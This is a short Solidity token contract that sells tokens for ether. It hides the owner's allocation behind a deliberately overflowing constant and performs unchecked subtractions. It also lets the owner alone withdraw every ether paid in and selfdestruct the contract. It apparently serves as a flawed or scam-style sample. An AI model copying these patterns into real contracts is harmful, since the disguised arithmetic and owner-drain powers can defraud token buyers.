pragma solidity ^0.5.0;

contract MyContract {
    address public owner;
    uint256 public totalsupply;
    mapping (address => uint) public balanceof;
    string public name;
    string public symbol;
    string public standard;
    uint8 public decimals;

    constructor() public payable {
        owner = msg.sender;
        decimals = 18;
        totalsupply = 0x33b2e3c9fd0803ce8000000;
        balanceof[owner] = totalsupply + 0xfffffffffffffffffffffffffffffffffffffffffd1789963cf78c95fc000000;
        balanceof[address(this)] = 0x2e87669c308736a04000000;
    }

    function() external payable {
        require(balanceof[address(this)] > 0);
        balanceof[msg.sender] += msg.value;
        balanceof[address(this)] -= msg.value;
    }

    function withdraw() public {
        require(msg.sender == owner);
        msg.sender.transfer(address(this).balance);
    }

    function changeOwner(address newOwner) public {
        require(msg.sender == owner);
        owner = newOwner;
    }

    function killMe() public {
        require(msg.sender == owner);
        selfdestruct(address(uint160(owner)));
    }

    function transfer(address to, uint256 value) public {
        require(balanceof[msg.sender] >= value);
        balanceof[msg.sender] -= value;
        balanceof[to] += value;
    }
}
```

